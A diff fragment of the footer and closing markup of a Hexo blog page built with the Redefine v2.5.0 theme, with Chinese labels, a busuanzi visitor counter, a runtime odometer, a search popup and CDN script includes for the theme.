+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Thou</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/Swup.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupSlideTheme.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupScriptsPlugin.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupProgressPlugin.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupScrollPlugin.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupPreloadPlugin.min.js"></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+<script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/imageViewer.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/utils.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/main.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/navbarShrink.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/scrollTopBottom.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/lightDarkSwitch.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/categoryList.js"></script>
+
+
+    <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/localSearch.js"></script>
+
+
+
+    <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/codeBlock.js"></script>
+
+
+
+    <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/runtime.js"></script>
+    <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/odometer.min.js"></script>
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/Typed.min.js"></script>
+  <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/anime.min.js"></script>
+        <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/tocToggle.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/toc.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+</body>
+</html>
